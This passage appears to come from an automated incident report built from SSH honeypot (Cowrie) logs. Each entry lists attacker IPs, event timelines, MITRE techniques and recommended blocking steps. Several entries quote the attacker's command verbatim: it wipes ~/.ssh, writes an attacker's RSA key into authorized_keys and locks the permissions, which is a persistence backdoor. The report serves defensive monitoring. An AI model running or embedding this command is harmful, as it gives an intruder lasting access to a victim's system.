| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:04:01` | `cowrie.session.connect` |
| `2026-04-23 12:04:01` | `cowrie.client.version` |
| `2026-04-23 12:04:02` | `cowrie.client.kex` |
| `2026-04-23 12:04:02` | `cowrie.login.success` |
| `2026-04-23 12:04:03` | `cowrie.session.params` |
| `2026-04-23 12:04:03` | `cowrie.command.input` |
| `2026-04-23 12:04:03` | `cowrie.command.failed` |
| `2026-04-23 12:04:03` | `cowrie.log.closed` |
| `2026-04-23 12:04:04` | `cowrie.session.params` |
| `2026-04-23 12:04:04` | `cowrie.command.input` |
| `2026-04-23 12:04:04` | `cowrie.session.file_download` |
| `2026-04-23 12:04:04` | `cowrie.log.closed` |
| `2026-04-23 12:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56205281b4fb

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-04-23 12:04 |
| **Last Seen** | 2026-04-23 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:04:06` | `cowrie.session.connect` |
| `2026-04-23 12:04:06` | `cowrie.client.version` |
| `2026-04-23 12:04:07` | `cowrie.client.kex` |
| `2026-04-23 12:04:07` | `cowrie.login.success` |
| `2026-04-23 12:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b97d6620601

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:09 |
| **Last Seen** | 2026-04-23 12:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:09:53` | `cowrie.session.connect` |
| `2026-04-23 12:09:53` | `cowrie.client.version` |
| `2026-04-23 12:09:53` | `cowrie.client.kex` |
| `2026-04-23 12:09:54` | `cowrie.login.success` |
| `2026-04-23 12:09:55` | `cowrie.session.params` |
| `2026-04-23 12:09:55` | `cowrie.command.input` |
| `2026-04-23 12:09:55` | `cowrie.command.failed` |
| `2026-04-23 12:09:55` | `cowrie.log.closed` |
| `2026-04-23 12:09:56` | `cowrie.session.params` |
| `2026-04-23 12:09:56` | `cowrie.command.input` |
| `2026-04-23 12:09:56` | `cowrie.session.file_download` |
| `2026-04-23 12:09:56` | `cowrie.log.closed` |
| `2026-04-23 12:10:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01f8d21e3767

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:09 |
| **Last Seen** | 2026-04-23 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:09:59` | `cowrie.session.connect` |
| `2026-04-23 12:09:59` | `cowrie.client.version` |
| `2026-04-23 12:10:00` | `cowrie.client.kex` |
| `2026-04-23 12:10:01` | `cowrie.login.success` |
| `2026-04-23 12:10:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6399926fb747

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:12 |
| **Last Seen** | 2026-04-23 12:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:12:36` | `cowrie.session.connect` |
| `2026-04-23 12:12:36` | `cowrie.client.version` |
| `2026-04-23 12:12:36` | `cowrie.client.kex` |
| `2026-04-23 12:12:37` | `cowrie.login.success` |
| `2026-04-23 12:12:38` | `cowrie.session.params` |
| `2026-04-23 12:12:38` | `cowrie.command.input` |
| `2026-04-23 12:12:38` | `cowrie.command.failed` |
| `2026-04-23 12:12:38` | `cowrie.log.closed` |
| `2026-04-23 12:12:39` | `cowrie.session.params` |
| `2026-04-23 12:12:39` | `cowrie.command.input` |
| `2026-04-23 12:12:39` | `cowrie.session.file_download` |
| `2026-04-23 12:12:39` | `cowrie.log.closed` |
| `2026-04-23 12:12:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65cd7fde7dd6

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:12 |
| **Last Seen** | 2026-04-23 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:12:42` | `cowrie.session.connect` |
| `2026-04-23 12:12:42` | `cowrie.client.version` |
| `2026-04-23 12:12:43` | `cowrie.client.kex` |
| `2026-04-23 12:12:44` | `cowrie.login.success` |
| `2026-04-23 12:12:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afdbef566c09

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:13 |
| **Last Seen** | 2026-04-23 12:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:13:30` | `cowrie.session.connect` |
| `2026-04-23 12:13:30` | `cowrie.client.version` |
| `2026-04-23 12:13:30` | `cowrie.client.kex` |
| `2026-04-23 12:13:32` | `cowrie.login.success` |
| `2026-04-23 12:13:32` | `cowrie.session.params` |
| `2026-04-23 12:13:32` | `cowrie.command.input` |
| `2026-04-23 12:13:32` | `cowrie.command.failed` |
| `2026-04-23 12:13:32` | `cowrie.log.closed` |
| `2026-04-23 12:13:33` | `cowrie.session.params` |
| `2026-04-23 12:13:33` | `cowrie.command.input` |
| `2026-04-23 12:13:33` | `cowrie.session.file_download` |
| `2026-04-23 12:13:33` | `cowrie.log.closed` |
| `2026-04-23 12:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-641aed5b62d3

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:13 |
| **Last Seen** | 2026-04-23 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:13:37` | `cowrie.session.connect` |
| `2026-04-23 12:13:37` | `cowrie.client.version` |
| `2026-04-23 12:13:37` | `cowrie.client.kex` |
| `2026-04-23 12:13:38` | `cowrie.login.success` |
| `2026-04-23 12:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c708e41ace34

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:14 |
| **Last Seen** | 2026-04-23 12:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:14:24` | `cowrie.session.connect` |
| `2026-04-23 12:14:24` | `cowrie.client.version` |
| `2026-04-23 12:14:24` | `cowrie.client.kex` |
| `2026-04-23 12:14:25` | `cowrie.login.success` |
| `2026-04-23 12:14:26` | `cowrie.session.params` |
| `2026-04-23 12:14:26` | `cowrie.command.input` |
| `2026-04-23 12:14:26` | `cowrie.command.failed` |
| `2026-04-23 12:14:26` | `cowrie.log.closed` |
| `2026-04-23 12:14:27` | `cowrie.session.params` |
| `2026-04-23 12:14:27` | `cowrie.command.input` |
| `2026-04-23 12:14:27` | `cowrie.session.file_download` |
| `2026-04-23 12:14:27` | `cowrie.log.closed` |
| `2026-04-23 12:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c7d1db3332

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:14 |
| **Last Seen** | 2026-04-23 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:14:30` | `cowrie.session.connect` |
| `2026-04-23 12:14:30` | `cowrie.client.version` |
| `2026-04-23 12:14:30` | `cowrie.client.kex` |
| `2026-04-23 12:14:32` | `cowrie.login.success` |
| `2026-04-23 12:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86191b442bd9

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:18 |
| **Last Seen** | 2026-04-23 12:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:18:56` | `cowrie.session.connect` |
| `2026-04-23 12:18:56` | `cowrie.client.version` |
| `2026-04-23 12:18:56` | `cowrie.client.kex` |
| `2026-04-23 12:18:58` | `cowrie.login.success` |
| `2026-04-23 12:18:58` | `cowrie.session.params` |
| `2026-04-23 12:18:58` | `cowrie.command.input` |
| `2026-04-23 12:18:58` | `cowrie.command.failed` |
| `2026-04-23 12:18:58` | `cowrie.log.closed` |
| `2026-04-23 12:18:59` | `cowrie.session.params` |
| `2026-04-23 12:18:59` | `cowrie.command.input` |
| `2026-04-23 12:18:59` | `cowrie.session.file_download` |
| `2026-04-23 12:18:59` | `cowrie.log.closed` |
| `2026-04-23 12:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f1484bb47b

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:19 |
| **Last Seen** | 2026-04-23 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:19:03` | `cowrie.session.connect` |
| `2026-04-23 12:19:03` | `cowrie.client.version` |
| `2026-04-23 12:19:03` | `cowrie.client.kex` |
| `2026-04-23 12:19:04` | `cowrie.login.success` |
| `2026-04-23 12:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4248f8c0c10d

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:28 |
| **Last Seen** | 2026-04-23 12:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:28:04` | `cowrie.session.connect` |
| `2026-04-23 12:28:04` | `cowrie.client.version` |
| `2026-04-23 12:28:04` | `cowrie.client.kex` |
| `2026-04-23 12:28:05` | `cowrie.login.success` |
| `2026-04-23 12:28:06` | `cowrie.session.params` |
| `2026-04-23 12:28:06` | `cowrie.command.input` |
| `2026-04-23 12:28:06` | `cowrie.command.failed` |
| `2026-04-23 12:28:06` | `cowrie.log.closed` |
| `2026-04-23 12:28:07` | `cowrie.session.params` |
| `2026-04-23 12:28:07` | `cowrie.command.input` |
| `2026-04-23 12:28:07` | `cowrie.session.file_download` |
| `2026-04-23 12:28:07` | `cowrie.log.closed` |
| `2026-04-23 12:28:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbb6f4fe6078

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:28 |
| **Last Seen** | 2026-04-23 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:28:11` | `cowrie.session.connect` |
| `2026-04-23 12:28:11` | `cowrie.client.version` |
| `2026-04-23 12:28:11` | `cowrie.client.kex` |
| `2026-04-23 12:28:12` | `cowrie.login.success` |
| `2026-04-23 12:28:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4a3c27aa485

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:28 |
| **Last Seen** | 2026-04-23 12:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:28:56` | `cowrie.session.connect` |
| `2026-04-23 12:28:56` | `cowrie.client.version` |
| `2026-04-23 12:28:56` | `cowrie.client.kex` |
| `2026-04-23 12:28:57` | `cowrie.login.success` |
| `2026-04-23 12:28:58` | `cowrie.session.params` |
| `2026-04-23 12:28:58` | `cowrie.command.input` |
| `2026-04-23 12:28:58` | `cowrie.command.failed` |
| `2026-04-23 12:28:58` | `cowrie.log.closed` |
| `2026-04-23 12:28:59` | `cowrie.session.params` |
| `2026-04-23 12:28:59` | `cowrie.command.input` |
| `2026-04-23 12:28:59` | `cowrie.session.file_download` |
| `2026-04-23 12:28:59` | `cowrie.log.closed` |
| `2026-04-23 12:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5218df54a31f

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-23 12:29 |
| **Last Seen** | 2026-04-23 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 12:29:02` | `cowrie.session.connect` |
| `2026-04-23 12:29:02` | `cowrie.client.version` |
| `2026-04-23 12:29:03` | `cowrie.client.kex` |
| `2026-04-23 12:29:04` | `cowrie.login.success` |
| `2026-04-23 12:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40afa881ec9d

| Field | Detail |
|---|---|
| **Source IP** | `46.24.47[.]94` |
| **First Seen** | 2026-04-23 13:12 |
| **Last Seen** | 2026-04-23 13:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:12:28` | `cowrie.session.connect` |
| `2026-04-23 13:12:28` | `cowrie.client.version` |
| `2026-04-23 13:12:29` | `cowrie.client.kex` |
| `2026-04-23 13:12:29` | `cowrie.login.success` |
| `2026-04-23 13:12:29` | `cowrie.session.params` |
